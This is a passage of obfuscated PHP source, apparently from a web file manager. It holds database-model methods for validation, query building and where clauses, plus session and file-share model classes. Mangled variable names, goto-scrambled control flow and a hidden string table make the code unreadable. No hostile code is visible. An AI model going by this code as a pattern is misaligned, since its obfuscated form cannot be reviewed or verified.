unset($this->options[$C²Ÿ‰ÍÍÛì[313]]); } elseif (!empty($this->_validate)) { $añç¯»›Ë = $this->_validate; } if (isset($añç¯»›Ë)) { if ($this->patchValidate) { $this->error = array(); } foreach ($añç¯»›Ë as $fªÔ÷­í•¾ => $FÆÊÂÖôå•) { if (empty($FÆÊÂÖôå•[5]) || $FÆÊÂÖôå•[5] == THINK_MODEL_BOTH || $FÆÊÂÖôå•[5] == $dšóŠéóò—) { if (0 == strpos($FÆÊÂÖôå•[2], $C²Ÿ‰ÍÍÛì[314]) && strpos($FÆÊÂÖôå•[2], $C²Ÿ‰ÍÍÛì[315])) { $FÆÊÂÖôå•[2] = think_lang(substr($FÆÊÂÖôå•[2], 2, -1)); } $FÆÊÂÖôå•[3] = isset($FÆÊÂÖôå•[3]) ? $FÆÊÂÖôå•[3] : THINK_EXISTS_VALIDATE; $FÆÊÂÖôå•[4] = isset($FÆÊÂÖôå•[4]) ? $FÆÊÂÖôå•[4] : $C²Ÿ‰ÍÍÛì[316]; switch ($FÆÊÂÖôå•[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Aí“ë÷»ğ®, $FÆÊÂÖôå•)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($C²Ÿ‰ÍÍÛì[33] != trim($Aí“ë÷»ğ®[$FÆÊÂÖôå•[0]])) { if (!1 === $this->_validationField($Aí“ë÷»ğ®, $FÆÊÂÖôå•)) { return !1; } } break; default: if (isset($Aí“ë÷»ğ®[$FÆÊÂÖôå•[0]])) { if (!1 === $this->_validationField($Aí“ë÷»ğ®, $FÆÊÂÖôå•)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($dĞØê§ˆóÙ, $EŞ‘„èÊ¬°) { if (!1 === $this->_validationFieldItem($dĞØê§ˆóÙ, $EŞ‘„èÊ¬°)) { if ($this->patchValidate) { $this->error[$EŞ‘„èÊ¬°[0]] = $EŞ‘„èÊ¬°[2]; } else { $this->error = $EŞ‘„èÊ¬°[2]; return !1; } } return; } protected function _validationFieldItem($Añâåñï˜, $f¶†¶¾ğÅ) { $eÌ×ÑƒÛ«† =& $_SERVER[Æ]; switch (strtolower(trim($f¶†¶¾ğÅ[4]))) { case $eÌ×ÑƒÛ«†[309]: case $eÌ×ÑƒÛ«†[310]: $b¾ÃÉÍç± = isset($f¶†¶¾ğÅ[6]) ? (array) $f¶†¶¾ğÅ[6] : array(); if (is_string($f¶†¶¾ğÅ[0]) && strpos($f¶†¶¾ğÅ[0], $eÌ×ÑƒÛ«†[47])) { $f¶†¶¾ğÅ[0] = explode($eÌ×ÑƒÛ«†[47], $f¶†¶¾ğÅ[0]); } if (is_array($f¶†¶¾ğÅ[0])) { foreach ($f¶†¶¾ğÅ[0] as $dÜÉÌÛ‹Ì‰) { $fš…¢Ä‘¯[$dÜÉÌÛ‹Ì‰] = $Añâåñï˜[$dÜÉÌÛ‹Ì‰]; } array_unshift($b¾ÃÉÍç±, $fš…¢Ä‘¯); } else { array_unshift($b¾ÃÉÍç±, $Añâåñï˜[$f¶†¶¾ğÅ[0]]); } if ($eÌ×ÑƒÛ«†[309] == $f¶†¶¾ğÅ[4]) { return call_user_func_array($f¶†¶¾ğÅ[1], $b¾ÃÉÍç±); } else { return call_user_func_array(array(&$this, $f¶†¶¾ğÅ[1]), $b¾ÃÉÍç±); } case $eÌ×ÑƒÛ«†[317]: return $Añâåñï˜[$f¶†¶¾ğÅ[0]] == $Añâåñï˜[$f¶†¶¾ğÅ[1]]; case $eÌ×ÑƒÛ«†[318]: if (is_string($f¶†¶¾ğÅ[0]) && strpos($f¶†¶¾ğÅ[0], $eÌ×ÑƒÛ«†[47])) { $f¶†¶¾ğÅ[0] = explode($eÌ×ÑƒÛ«†[47], $f¶†¶¾ğÅ[0]); } $bĞ­ÊÂÈŒ‰ = array(); if (is_array($f¶†¶¾ğÅ[0])) { foreach ($f¶†¶¾ğÅ[0] as $dÜÉÌÛ‹Ì‰) { $bĞ­ÊÂÈŒ‰[$dÜÉÌÛ‹Ì‰] = $Añâåñï˜[$dÜÉÌÛ‹Ì‰]; } } else { $bĞ­ÊÂÈŒ‰[$f¶†¶¾ğÅ[0]] = $Añâåñï˜[$f¶†¶¾ğÅ[0]]; } if (!empty($Añâåñï˜[$this->getPk()])) { $bĞ­ÊÂÈŒ‰[$this->getPk()] = array($eÌ×ÑƒÛ«†[319], $Añâåñï˜[$this->getPk()]); } if ($this->where($bĞ­ÊÂÈŒ‰)->find()) { return !1; } return !0; default: return $this->check($Añâåñï˜[$f¶†¶¾ğÅ[0]], $f¶†¶¾ğÅ[1], $f¶†¶¾ğÅ[4]); } } public function check($CÆ“à‹‘ìÖ, $eÌ‡–µºˆì, $Bä¢§¥ïÆ» = "\162\x65\x67\x65\170") { $D­ÖÉÕ =& $_SERVER[Æ]; $Bä¢§¥ïÆ» = strtolower(trim($Bä¢§¥ïÆ»)); switch ($Bä¢§¥ïÆ») { case $D­ÖÉÕ[7]: case $D­ÖÉÕ[320]: $fÙœ©Õˆšâ = is_array($eÌ‡–µºˆì) ? $eÌ‡–µºˆì : explode($D­ÖÉÕ[47], $eÌ‡–µºˆì); return $Bä¢§¥ïÆ» == $D­ÖÉÕ[7] ? in_array($CÆ“à‹‘ìÖ, $fÙœ©Õˆšâ) : !in_array($CÆ“à‹‘ìÖ, $fÙœ©Õˆšâ); case $D­ÖÉÕ[321]: case $D­ÖÉÕ[322]: if (is_array($eÌ‡–µºˆì)) { $b¼†ï¦¶ = $eÌ‡–µºˆì[0]; $aÛ“½¯¸ = $eÌ‡–µºˆì[1]; } else { list($b¼†ï¦¶, $aÛ“½¯¸) = explode($D­ÖÉÕ[47], $eÌ‡–µºˆì); } return $Bä¢§¥ïÆ» == $D­ÖÉÕ[321] ? $CÆ“à‹‘ìÖ >= $b¼†ï¦¶ && $CÆ“à‹‘ìÖ <= $aÛ“½¯¸ : $CÆ“à‹‘ìÖ < $b¼†ï¦¶ || $CÆ“à‹‘ìÖ > $aÛ“½¯¸; case $D­ÖÉÕ[323]: case $D­ÖÉÕ[324]: return $Bä¢§¥ïÆ» == $D­ÖÉÕ[323] ? $CÆ“à‹‘ìÖ == $eÌ‡–µºˆì : $CÆ“à‹‘ìÖ != $eÌ‡–µºˆì; case $D­ÖÉÕ[325]: $b¬‡›”ğÁğ = mb_strlen($CÆ“à‹‘ìÖ, $D­ÖÉÕ[326]); if (strpos($eÌ‡–µºˆì, $D­ÖÉÕ[47])) { list($b¼†ï¦¶, $aÛ“½¯¸) = explode($D­ÖÉÕ[47], $eÌ‡–µºˆì); return $b¬‡›”ğÁğ >= $b¼†ï¦¶ && $b¬‡›”ğÁğ <= $aÛ“½¯¸; } else { return $b¬‡›”ğÁğ == $eÌ‡–µºˆì; } case $D­ÖÉÕ[327]: list($BÒ²­Ííêô, $A››”Ó½) = explode($D­ÖÉÕ[47], $eÌ‡–µºˆì); if (!is_numeric($BÒ²­Ííêô)) { $BÒ²­Ííêô = strtotime($BÒ²­Ííêô); } if (!is_numeric($A››”Ó½)) { $A››”Ó½ = strtotime($A››”Ó½); } return NOW_TIME >= $BÒ²­Ííêô && NOW_TIME <= $A››”Ó½; case $D­ÖÉÕ[328]: return in_array(get_client_ip(), explode($D­ÖÉÕ[47], $eÌ‡–µºˆì)); case $D­ÖÉÕ[329]: return !in_array(get_client_ip(), explode($D­ÖÉÕ[47], $eÌ‡–µºˆì)); case $D­ÖÉÕ[316]: default: return $this->regex($CÆ“à‹‘ìÖ, $eÌ‡–µºˆì); } } public function query($e±³´÷ßÛõ, $B‹ãÒ£Ú” = false) { $EÂ­ª‹’Ğ =& $_SERVER[Æ]; if (!is_bool($B‹ãÒ£Ú”) && !is_array($B‹ãÒ£Ú”)) { $B‹ãÒ£Ú” = func_get_args(); array_shift($B‹ãÒ£Ú”); } $e±³´÷ßÛõ = str_replace(array($EÂ­ª‹’Ğ[217], $EÂ­ª‹’Ğ[330]), $EÂ­ª‹’Ğ[50], $e±³´÷ßÛõ); $e±³´÷ßÛõ = $this->parseSql($e±³´÷ßÛõ, $B‹ãÒ£Ú”); return $this->db->query($e±³´÷ßÛõ); } public function execute($Eèæ†¡ùò, $A„®‰‡âÓ = false) { if (!is_bool($A„®‰‡âÓ) && !is_array($A„®‰‡âÓ)) { $A„®‰‡âÓ = func_get_args(); array_shift($A„®‰‡âÓ); } $Eèæ†¡ùò = $this->parseSql($Eèæ†¡ùò, $A„®‰‡âÓ); return $this->db->execute($Eèæ†¡ùò); } protected function parseSql($F›¢ë…øÍ, $E»›è¡Ş²é) { $BëÄ”µç‘° =& $_SERVER[Æ]; if (!0 === $E»›è¡Ş²é) { $B•ŸÜ‹ç‡™ = $this->_parseOptions(); $F›¢ë…øÍ = $this->db->parseSql($F›¢ë…øÍ, $B•ŸÜ‹ç‡™); } elseif (is_array($E»›è¡Ş²é)) { $E»›è¡Ş²é = array_map(array($this->db, $BëÄ”µç‘°[331]), $E»›è¡Ş²é); $F›¢ë…øÍ = vsprintf($F›¢ë…øÍ, $E»›è¡Ş²é); } else { $F›¢ë…øÍ = strtr($F›¢ë…øÍ, array($BëÄ”µç‘°[332] => $this->getTableName(), $BëÄ”µç‘°[333] => think_config($BëÄ”µç‘°[232]))); } $this->db->setModel($this->name); return $F›¢ë…øÍ; } public function db($aƒ½¸°œ = '', $F‹ñŒ’ø½‘ = '', $fÃÔ¨¯ö¥¯ = array()) { goto Bö¨ßõ½Ê¸; FÕÚ×°—‚Ê: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto b«ÍÉõäáİ; bòêìŒì©•: $FÍåº“‘¼õ[$aƒ½¸°œ] = $F‹ñŒ’ø½‘; $this->db = $bÕî†Ñœ¥…[$aƒ½¸°œ]; $this->_after_db(); goto FÕÚ×°—‚Ê; Bö¨ßõ½Ê¸: $F¬ÆÂŒØ°™ =& $_SERVER[Æ]; if ($F¬ÆÂŒØ°™[33] === $aƒ½¸°œ && $this->db) { return $this->db; } static $FÍåº“‘¼õ = array(); goto dÎØâİ¥µ•; dÎØâİ¥µ•: static $bÕî†Ñœ¥… = array(); if (!isset($bÕî†Ñœ¥…[$aƒ½¸°œ]) || isset($bÕî†Ñœ¥…[$aƒ½¸°œ]) && $F‹ñŒ’ø½‘ && $FÍåº“‘¼õ[$aƒ½¸°œ] != $F‹ñŒ’ø½‘) { if (!empty($F‹ñŒ’ø½‘) && is_string($F‹ñŒ’ø½‘) && !1 === strpos($F‹ñŒ’ø½‘, $F¬ÆÂŒØ°™[8])) { $F‹ñŒ’ø½‘ = think_config($F‹ñŒ’ø½‘); } $bÕî†Ñœ¥…[$aƒ½¸°œ] = Db::getInstance($F‹ñŒ’ø½‘); } elseif (NULL === $F‹ñŒ’ø½‘) { $bÕî†Ñœ¥…[$aƒ½¸°œ]->close(); unset($bÕî†Ñœ¥…[$aƒ½¸°œ]); return; } if (!empty($fÃÔ¨¯ö¥¯)) { if (is_string($fÃÔ¨¯ö¥¯)) { parse_str($fÃÔ¨¯ö¥¯, $fÃÔ¨¯ö¥¯); } foreach ($fÃÔ¨¯ö¥¯ as $aÛˆÁ³ôÓ× => $f¥ëÓÈ¤Ü) { $this->setProperty($aÛˆÁ³ôÓ×, $f¥ëÓÈ¤Ü); } } goto bòêìŒì©•; b«ÍÉõäáİ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Déœö–àˆ¼ = get_class($this); if ($Déœö–àˆ¼ == $_SERVER[Æ][334]) { return $this->name; } $this->name = substr($Déœö–àˆ¼, 0, -5); } return $this->name; } public function getTableName() { $Bá„»¤ø˜ =& $_SERVER[Æ]; if (empty($this->trueTableName)) { $a¬‘¢‡ùÂ = !empty($this->tablePrefix) ? $this->tablePrefix : $Bá„»¤ø˜[33]; if (!empty($this->tableName)) { $a¬‘¢‡ùÂ .= $this->tableName; } else { $a¬‘¢‡ùÂ .= think_parse_name($this->name); } $this->trueTableName = strtolower($a¬‘¢‡ùÂ); } return (!empty($this->dbName) ? $this->dbName . $Bá„»¤ø˜[91] : $Bá„»¤ø˜[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $CÇ·Ë‹ø×Ú =& $_SERVER[Æ]; return isset($this->fields[$CÇ·Ë‹ø×Ú[239]]) ? $this->fields[$CÇ·Ë‹ø×Ú[239]] : $this->pk; } public function getDbFields() { $EË¨·‡ëÅ =& $_SERVER[Æ]; if (isset($this->options[$EË¨·‡ëÅ[267]])) { $B®¯Õò—Ú• = $this->db->getFields($this->options[$EË¨·‡ëÅ[267]]); return $B®¯Õò—Ú• ? array_keys($B®¯Õò—Ú•) : !1; } if ($this->fields) { $B®¯Õò—Ú• = $this->fields; unset($B®¯Õò—Ú•[$EË¨·‡ëÅ[238]], $B®¯Õò—Ú•[$EË¨·‡ëÅ[239]], $B®¯Õò—Ú•[$EË¨·‡ëÅ[240]], $B®¯Õò—Ú•[$EË¨·‡ëÅ[237]]); return $B®¯Õò—Ú•; } return !1; } public function data($Eæ‚İ»ƒéó = '') { $D¾Š›µ‘• =& $_SERVER[Æ]; if ($D¾Š›µ‘•[33] === $Eæ‚İ»ƒéó && !empty($this->data)) { return $this->data; } if (is_object($Eæ‚İ»ƒéó)) { $Eæ‚İ»ƒéó = get_object_vars($Eæ‚İ»ƒéó); } elseif (is_string($Eæ‚İ»ƒéó)) { parse_str($Eæ‚İ»ƒéó, $Eæ‚İ»ƒéó); } elseif (!is_array($Eæ‚İ»ƒéó)) { think_exception(think_lang($D¾Š›µ‘•[259])); } $this->data = $Eæ‚İ»ƒéó; return $this; } public function join($bï¢ºïî) { $b¹¾²¥®÷¼ =& $_SERVER[Æ]; if (is_array($bï¢ºïî)) { $this->options[$b¹¾²¥®÷¼[270]] = $bï¢ºïî; } elseif (!empty($bï¢ºïî)) { $this->options[$b¹¾²¥®÷¼[270]][] = $bï¢ºïî; } return $this; } public function union($eÏ÷åğŞ„¨, $E”ÛÊŞ® = false) { goto c‘ƒŠ¼èŒ; c‘ƒŠ¼èŒ: $DÖ‡§Ğ‰å‹ =& $_SERVER[Æ]; if (empty($eÏ÷åğŞ„¨)) { return $this; } if ($E”ÛÊŞ®) { $this->options[$DÖ‡§Ğ‰å‹[335]][$DÖ‡§Ğ‰å‹[336]] = !0; } goto a¡¤Ì™¥¾; a¡¤Ì™¥¾: if (is_object($eÏ÷åğŞ„¨)) { $eÏ÷åğŞ„¨ = get_object_vars($eÏ÷åğŞ„¨); } if (is_string($eÏ÷åğŞ„¨)) { $C×Ö»¾Œïí = $eÏ÷åğŞ„¨; } elseif (is_array($eÏ÷åğŞ„¨)) { if (isset($eÏ÷åğŞ„¨[0])) { $this->options[$DÖ‡§Ğ‰å‹[335]] = array_merge($this->options[$DÖ‡§Ğ‰å‹[335]], $eÏ÷åğŞ„¨); return $this; } else { $C×Ö»¾Œïí = $eÏ÷åğŞ„¨; } } else { think_exception(think_lang($DÖ‡§Ğ‰å‹[259])); } $this->options[$DÖ‡§Ğ‰å‹[335]][] = $C×Ö»¾Œïí; goto cù’˜Æ…æé; cù’˜Æ…æé: return $this; goto Cß˜È¾®¤˜; Cß˜È¾®¤˜: } public function cache($A½«ĞÍØÉ = true, $C¥–»‹í¯ = null, $eí‰ÃŒµ = '') { $e¬òÅµàéÉ =& $_SERVER[Æ]; if (!1 !== $A½«ĞÍØÉ) { $this->options[$e¬òÅµàéÉ[337]] = array($e¬òÅµàéÉ[89] => $A½«ĞÍØÉ, $e¬òÅµàéÉ[327] => $C¥–»‹í¯, $e¬òÅµàéÉ[29] => $eí‰ÃŒµ); } return $this; } public function field($eƒâƒÓ‡´Â, $Dáî¤æà–á = false) { $A†Ş¨‰­ =& $_SERVER[Æ]; if (!0 === $eƒâƒÓ‡´Â) { $a‡ó‰¦Ş‰ù = $this->getDbFields(); $eƒâƒÓ‡´Â = $a‡ó‰¦Ş‰ù ? $a‡ó‰¦Ş‰ù : $A†Ş¨‰­[176]; } elseif ($Dáî¤æà–á) { if (is_string($eƒâƒÓ‡´Â)) { $eƒâƒÓ‡´Â = explode($A†Ş¨‰­[47], $eƒâƒÓ‡´Â); } $a‡ó‰¦Ş‰ù = $this->getDbFields(); $eƒâƒÓ‡´Â = $a‡ó‰¦Ş‰ù ? array_diff($a‡ó‰¦Ş‰ù, $eƒâƒÓ‡´Â) : $eƒâƒÓ‡´Â; } $this->options[$A†Ş¨‰­[261]] = $eƒâƒÓ‡´Â; return $this; } public function scope($B”˜¤¡Ê‹ó = '', $c÷Õ›êˆ = NULL) { $e‘¿ÇÀÑà =& $_SERVER[Æ]; if ($e‘¿ÇÀÑà[33] === $B”˜¤¡Ê‹ó) { if (isset($this->_scope[$e‘¿ÇÀÑà[34]])) { $aÈ×¹½§ß´ = $this->_scope[$e‘¿ÇÀÑà[34]]; } else { return $this; } } elseif (is_string($B”˜¤¡Ê‹ó)) { $fÚŞ‡êåÔË = explode($e‘¿ÇÀÑà[47], $B”˜¤¡Ê‹ó); $aÈ×¹½§ß´ = array(); foreach ($fÚŞ‡êåÔË as $Dä–£ßáï) { if (!isset($this->_scope[$Dä–£ßáï])) { continue; } $aÈ×¹½§ß´ = array_merge($aÈ×¹½§ß´, $this->_scope[$Dä–£ßáï]); } if (!empty($c÷Õ›êˆ) && is_array($c÷Õ›êˆ)) { $aÈ×¹½§ß´ = array_merge($aÈ×¹½§ß´, $c÷Õ›êˆ); } } elseif (is_array($B”˜¤¡Ê‹ó)) { $aÈ×¹½§ß´ = $B”˜¤¡Ê‹ó; } if (is_array($aÈ×¹½§ß´) && !empty($aÈ×¹½§ß´)) { $this->options = array_merge($this->options, array_change_key_case($aÈ×¹½§ß´)); } return $this; } public function where($AêŒÎäë´Š, $F¹ÀùÎ›“ë = null) { $bƒ‘÷­ã =& $_SERVER[Æ]; if (!is_null($F¹ÀùÎ›“ë) && is_string($AêŒÎäë´Š)) { if (!is_array($F¹ÀùÎ›“ë)) { $F¹ÀùÎ›“ë = func_get_args(); array_shift($F¹ÀùÎ›“ë); } $F¹ÀùÎ›“ë = array_map(array($this->db, $bƒ‘÷­ã[331]), $F¹ÀùÎ›“ë); $AêŒÎäë´Š = vsprintf($AêŒÎäë´Š, $F¹ÀùÎ›“ë); } elseif (is_object($AêŒÎäë´Š)) { $AêŒÎäë´Š = get_object_vars($AêŒÎäë´Š); } elseif (is_array($AêŒÎäë´Š)) { foreach ($AêŒÎäë´Š as $cõ¥ßØÚÒë => $F˜¿ÓÁĞå) { if ((is_numeric($cõ¥ßØÚÒë) || !$cõ¥ßØÚÒë) && is_string($F˜¿ÓÁĞå)) { think_trace($bƒ‘÷­ã[338], $bƒ‘÷­ã[33], $bƒ‘÷­ã[46]); die; } } } if (is_string($AêŒÎäë´Š) && $bƒ‘÷­ã[33] != $AêŒÎäë´Š) { $A×äˆ¸ò„‰ = array(); $A×äˆ¸ò„‰[$bƒ‘÷­ã[339]] = $AêŒÎäë´Š; $AêŒÎäë´Š = $A×äˆ¸ò„‰; } if (isset($this->options[$bƒ‘÷­ã[263]])) { $this->options[$bƒ‘÷­ã[263]] = array_merge($this->options[$bƒ‘÷­ã[263]], $AêŒÎäë´Š); } else { $this->options[$bƒ‘÷­ã[263]] = $AêŒÎäë´Š; } return $this; } public function limit($c©‹®ƒºàí, $a¯ˆêàšä = null) { $Cå±’±ŒÂ =& $_SERVER[Æ]; $this->options[$Cå±’±ŒÂ[280]] = is_null($a¯ˆêàšä) ? $c©‹®ƒºàí : $c©‹®ƒºàí . $Cå±’±ŒÂ[47] . $a¯ˆêàšä; return $this; } public function page($FßÙøĞ‹Îß, $d“ÈæŞÊ¶° = null) { $AëâÙÆÚÜï =& $_SERVER[Æ]; $this->options[$AëâÙÆÚÜï[340]] = is_null($d“ÈæŞÊ¶°) ? $FßÙøĞ‹Îß : $FßÙøĞ‹Îß . $AëâÙÆÚÜï[47] . $d“ÈæŞÊ¶°; return $this; } public function comment($AœñöˆÒƒĞ) { $this->options[$_SERVER[Æ][341]] = $AœñöˆÒƒĞ; return $this; } public function setProperty($EµŒ×³Ú¸¢, $E‚ô²Òø©Š) { if (property_exists($this, $EµŒ×³Ú¸¢)) { $this->{$EµŒ×³Ú¸¢} = $E‚ô²Òø©Š; } return $this; } } goto CŸÆòøš; D¦‚İ™ã®¶: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\x6d\x5f\163\x65\x73\163\151\x6f\x6e"; public function get($eëà…òÅ) { $E¨‘ÑÊ…çÀ =& $_SERVER[Æ]; $d™¯©ÜÙ±æ = $this->where(array($E¨‘ÑÊ…çÀ[2202] => $eëà…òÅ))->find(); if (!is_array($d™¯©ÜÙ±æ)) { return !1; } return $d™¯©ÜÙ±æ[$E¨‘ÑÊ…çÀ[690]]; } public function set($A·ñŒ¼Ä¨¯, $eÛ”š¾Î’¸, $EÃİ®ê˜¢ = 3600) { $A†…íÊĞ­ñ =& $_SERVER[Æ]; $d§°Â»ÆİÅ = array($A†…íÊĞ­ñ[2202] => $A·ñŒ¼Ä¨¯, $A†…íÊĞ­ñ[2131] => $eÛ”š¾Î’¸, $A†…íÊĞ­ñ[2203] => $EÃİ®ê˜¢ + time()); if (Session::get($A†…íÊĞ­ñ[2204])) { $d§°Â»ÆİÅ[$A†…íÊĞ­ñ[1434]] = Session::get($A†…íÊĞ­ñ[2204]); } else { $d§°Â»ÆİÅ[$A†…íÊĞ­ñ[1434]] = 0; } if ($this->get($A·ñŒ¼Ä¨¯)) { return $this->where(array($A†…íÊĞ­ñ[2202] => $A·ñŒ¼Ä¨¯))->save($d§°Â»ÆİÅ); } else { return $this->add($d§°Â»ÆİÅ, array(), !0); } } public function remove($AãŒî×®õ ) { return $this->where(array($_SERVER[Æ][2202] => $AãŒî×®õ ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Æ][2205] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\x69\155\x65", "\164\151\155\x65", "\151\x6e\163\145\x72\x74\x2c\x75\x70\x64\141\x74\145", "\146\x75\x6e\x63\164\151\x6f\x6e"), array("\143\x72\145\141\x74\145\124\x69\155\x65", "\164\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\x66\x75\156\143\x74\x69\x6f\x6e"), array("\157\160\x74\x69\x6f\156\163", '', "\151\156\x73\145\162\x74\54\x75\x70\144\141\x74\x65\54\163\x65\x6c\145\143\164", "\x6a\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($D¬‰ÏÇèªÎ) { $Dê‘Î½›ŒŠ =& $_SERVER[Æ]; $FšÍ½£öæä = isset($D¬‰ÏÇèªÎ[0]) ? $D¬‰ÏÇèªÎ[0] : !1; return array($Dê‘Î½›ŒŠ[2206] => array(USER_ID, $Dê‘Î½›ŒŠ[2207]), $Dê‘Î½›ŒŠ[2169] => array($FšÍ½£öæä, $Dê‘Î½›ŒŠ[2208])); } protected function listSimple() { $aÁ³õ®ëä¹ = array($_SERVER[Æ][1434] => USER_ID); $F‚¤Ø—ñÏó = $this->field($this->fieldList)->where($aÁ³õ®ëä¹)->select(); return $F‚¤Ø—ñÏó ? $F‚¤Ø—ñÏó : array(); } protected function getInfo($a†½ïˆÜÀß, $fÙÙ†À‘Ü = false) { $EÎÊˆ¬ÓŒ =& $_SERVER[Æ]; if ($fÙÙ†À‘Ü) { return $this->_getShareInfo(array($EÎÊˆ¬ÓŒ[441] => $a†½ïˆÜÀß)); } $aºÄ—³‘Ùø = $this->cacheFunctionGet($EÎÊˆ¬ÓŒ[2209], $a†½ïˆÜÀß); return $aºÄ—³‘Ùø; } public function getInfoByHash($e²ÍñóÆìŸ) { return $this->_getShareInfo(array($_SERVER[Æ][443] => $e²ÍñóÆìŸ)); } public function getInfoByPath($bŒùÑãŸçå) { $dˆÚ…ƒŒÄê =& $_SERVER[Æ]; $bï‹¤Œ¦íÜ = array($dˆÚ…ƒŒÄê[1434] => USER_ID, $dˆÚ…ƒŒÄê[369] => $bŒùÑãŸçå); return $this->_getShareInfo($bï‹¤Œ¦íÜ); } public function getInfoBySourcePath($AĞç—ã²±) { $eÉä¬óÎÍ =& $_SERVER[Æ]; $eçèÒÙ¬‡ = array($eÉä¬óÎÍ[1434] => USER_ID, $eÉä¬óÎÍ[1018] => $AĞç—ã²±); return $this->_getShareInfo($eçèÒÙ¬‡); } private function _getShareInfo($fÑ£ˆŸ§‹Ğ) { goto bÃÒ‡Û‚÷ì; A‰õ‘Ğä—: $fÑ£ˆŸ§‹Ğ = array($D™•“à‹–Œ[441] => $F¥áÔÓ»Ø‚[$D™•“à‹–Œ[441]]); $dö‰¥‹°Ñ¨ = $D™•“à‹–Œ[2210]; $A¬Áš—š = Model($D™•“à‹–Œ[537])->order($D™•“à‹–Œ[367])->field($dö‰¥‹°Ñ¨)->where($fÑ£ˆŸ§‹Ğ)->select(); goto D•¿è˜Å¦; bÃÒ‡Û‚÷ì: $D™•“à‹–Œ =& $_SERVER[Æ]; $F¥áÔÓ»Ø‚ = $this->where($fÑ£ˆŸ§‹Ğ)->find(); if (!$F¥áÔÓ»Ø‚) { return !1; } goto A‰õ‘Ğä—; D•¿è˜Å¦: if ($F¥áÔÓ»Ø‚[$D™•“à‹–Œ[369]] == $D™•“à‹–Œ[468]) { $F¥áÔÓ»Ø‚[$D™•“à‹–Œ[391]] = IO::info($F¥áÔÓ»Ø‚[$D™•“à‹–Œ[1018]]); } else { $F¥áÔÓ»Ø‚[$D™•“à‹–Œ[391]] = Model($D™•“à‹–Œ[1117])->pathInfo($F¥áÔÓ»Ø‚[$D™•“à‹–Œ[369]]); } $F¥áÔÓ»Ø‚[$D™•“à‹–Œ[2211]] = $A¬Áš—š; return $F¥áÔÓ»Ø‚; goto aŠÓ³åÃíÓ; aŠÓ³åÃíÓ: } protected function getInfoAuth($EêÙ™«æˆ) { $D×öœ™Ÿ =& $_SERVER[Æ]; $bêƒŒº‚È° = $this->getInfo($EêÙ™«æˆ); $bêƒŒº‚È°[$D×öœ™Ÿ[376]] = Model($D×öœ™Ÿ[454])->authMake($bêƒŒº‚È°[$D×öœ™Ÿ[2211]]); return $bêƒŒº‚È°; } protected function listData($c¼İØœˆ¦ = null, $bšë˜Ï’–• = 300) { $e´ù©‹¡ßí =& $_SERVER[Æ]; $C¤¯è­Ğô = array(array($e´ù©‹¡ßí[446] => array($e´ù©‹¡ßí[927], 0), $e´ù©‹¡ßí[448] => array($e´ù©‹¡ßí[927], 0), $e´ù©‹¡ßí[2212] => $e´ù©‹¡ßí[2181])); if ($c¼İØœˆ¦ == $e´ù©‹¡ßí[1868]) { $C¤¯è­Ğô = array($e´ù©‹¡ßí[446] => 1); } else { if ($c¼İØœˆ¦ == $e´ù©‹¡ßí[1007]) { $C¤¯è­Ğô = array($e´ù©‹¡ßí[448] => 1); } } $C¤¯è­Ğô[$e´ù©‹¡ßí[1434]] = USER_ID; $aÀï¸¹–„ğ = $this->where($C¤¯è­Ğô)->selectPage($bšë˜Ï’–•); return $aÀï¸¹–„ğ; } protected function listToMe($bÙ“¶¶×ö = 300) { goto aÉ›Ä©¥¬; DŠÃ†‘øá: $CÓÇÂ„ÈŒª = array($D‘ù‡«ùÚ[441] => array($D‘ù‡«ùÚ[384], array_keys($B‡âŠé±â©))); $Dóß¹ØÆ‘ã = $this->field($Fˆ‚Ø†¥)->where($CÓÇÂ„ÈŒª)->select(); foreach ($Dóß¹ØÆ‘ã as $D¯…½•Ä‘´ => &$E¦’×õ±ë‰) { $E¦’×õ±ë‰[$D‘ù‡«ùÚ[2211]] = $B‡âŠé±â©[$E¦’×õ±ë‰[$D‘ù‡«ùÚ[441]]]; } goto bÉäÙ¡¶Àç; c÷§¶¶ãæ: $CÓÇÂ„ÈŒª = array($D‘ù‡«ùÚ[521] => SourceModel::TYPE_USER, $D‘ù‡«ùÚ[456] => USER_ID); if ($C’Û˜‰Ä„›) { $CÓÇÂ„ÈŒª = array(array($D‘ù‡«ùÚ[521] => SourceModel::TYPE_USER, $D‘ù‡«ùÚ[456] => USER_ID), array($D‘ù‡«ùÚ[521] => SourceModel::TYPE_GROUP, $D‘ù‡«ùÚ[456] => array($D‘ù‡«ùÚ[7], $C’Û˜‰Ä„›)), $D‘ù‡«ùÚ[2212] => $D‘ù‡«ùÚ[2181]); } $f§»À±è¯ = Model($D‘ù‡«ùÚ[537])->where($CÓÇÂ„ÈŒª)->selectPage($bÙ“¶¶×ö); goto E¶»ï©Õ„; bÉäÙ¡¶Àç: $AäÀ¼ƒí = array($D‘ù‡«ùÚ[2215] => $Dóß¹ØÆ‘ã, $D‘ù‡«ùÚ[2216] => $f§»À±è¯[$D‘ù‡«ùÚ[351]]); return $AäÀ¼ƒí; goto bÙÚâÔ¡; aÉ›Ä©¥¬: $D‘ù‡«ùÚ =& $_SERVER[Æ]; $eÙö«ƒ³Š¼ = Session::get($D‘ù‡«ùÚ[2213]); $C’Û˜‰Ä„› = array_to_keyvalue($eÙö«ƒ³Š¼, $D‘ù‡«ùÚ[33], $D‘ù‡«ùÚ[2101]); goto c÷§¶¶ãæ; E¶»ï©Õ„: $B‡âŠé±â© = array_to_keyvalue_group($f§»À±è¯[$D‘ù‡«ùÚ[354]], $D‘ù‡«ùÚ[441]); if (!$B‡âŠé±â©) { return $f§»À±è¯; } $Fˆ‚Ø†¥ = 